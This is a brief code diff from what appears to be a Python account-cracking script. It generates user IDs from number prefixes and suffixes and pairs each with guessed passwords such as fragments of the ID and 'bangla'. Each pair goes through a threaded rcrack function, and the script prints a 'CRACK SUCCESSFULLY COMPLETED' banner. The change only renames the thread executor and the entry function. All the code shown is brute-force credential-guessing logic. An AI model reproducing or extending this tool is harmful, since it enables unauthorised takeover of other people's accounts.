@@ -128,7 +128,7 @@ def fuck():
         for guru in user:
             uid = nude+nudex+nud+guru
             pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
-            NK.submit(rcrack,uid,pwx,tl)
+            NILOY.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
     print('\033[1;32m─────────────────────────────────────────────────────────')
@@ -200,4 +200,4 @@ def rcrack(uid,pwx,tl):
     except:
         pass
 
-fuck()
+main()
